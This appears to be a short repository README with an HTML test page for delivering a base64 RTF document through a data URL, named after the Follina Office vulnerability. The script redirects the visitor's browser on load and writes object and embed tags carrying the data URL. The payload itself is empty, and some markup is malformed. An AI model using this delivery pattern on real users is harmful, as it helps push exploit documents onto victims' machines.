# follina_data_url_test
Follina Test

```html
<!DOCTYPE html>
<html>
<script>
var b64str = "=";
var myBase64string = "data:application/rtf;base64,";
myBase64string += b64str
var objbuilder = '';
window.location.href = myBase64string;
objbuilder += ('<object width="100%" height="100%" ); data="data:application/pdf;base64,');
objbuilder += (myBase64string);
objbuilder += ('" type="application/pdf" class="internal">');
objbuilder += ('<embed src="data:application/pdf;base64,');
objbuilder += (myBase64string);
objbuilder += ('" type="application/pdf"  />');
objbuilder += ('</object>');

var win = window.open("#","_blank");
var title = "my tab title";
window.document.write('<html><title>'+ title +'</title><body style="margin-top: 0px; margin-left: 0px; margin-right: 0px; margin-bottom: 0px;">');
window.document.write(objbuilder);
window.document.write('</body></html>');
layer = jQuery(window.document);
</script>
<h1>Test</h1>
</html>
```
